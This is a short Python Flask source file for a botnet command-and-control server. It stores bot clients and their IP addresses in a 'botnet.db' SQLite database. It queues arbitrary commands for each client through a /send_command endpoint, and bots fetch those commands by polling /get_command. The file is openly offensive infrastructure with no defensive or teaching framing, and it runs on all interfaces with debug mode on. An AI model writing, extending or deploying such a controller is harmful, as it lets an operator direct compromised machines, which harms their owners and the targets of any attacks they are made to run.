from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clients
               (id TEXT PRIMARY KEY, ip TEXT, last_seen TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands 
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  client_id TEXT, command TEXT, status TEXT)''')
    conn.commit()
    conn.close()

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    client_id = data.get('id')
    ip = request.remote_addr

    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO clients (id, ip, last_seen) VALUES (?, ?, datetime('now'))", (client_id, ip))
    conn.commit()
    conn.close()
    return jsonify({"status": "registered", "id": client_id})

@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    client_id = data.get('client_id')
    command = data.get('command')

    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    c.execute("INSERT INTO commands (client_id, command, status) VALUES (?, ?, 'pending')", (client_id, command))
    conn.commit()
    conn.close()
    return jsonify({"status": "command queued"})

@app.route('/get_command', methods=['GET'])
def get_command():
    client_id = request.args.get('id')

    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    c.execute("SELECT id, command FROM commands WHERE client_id = ? AND status = 'pending' LIMIT 1", (client_id,))
    result = c.fetchone()

    if result:
        c.execute("UPDATE commands SET status = 'sent' WHERE id = ?", (result[0],))
        conn.commit()
        conn.close()
        return jsonify({"command": result[1]})

    conn.close()
    return jsonify({"command": None})

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000, debug=True)
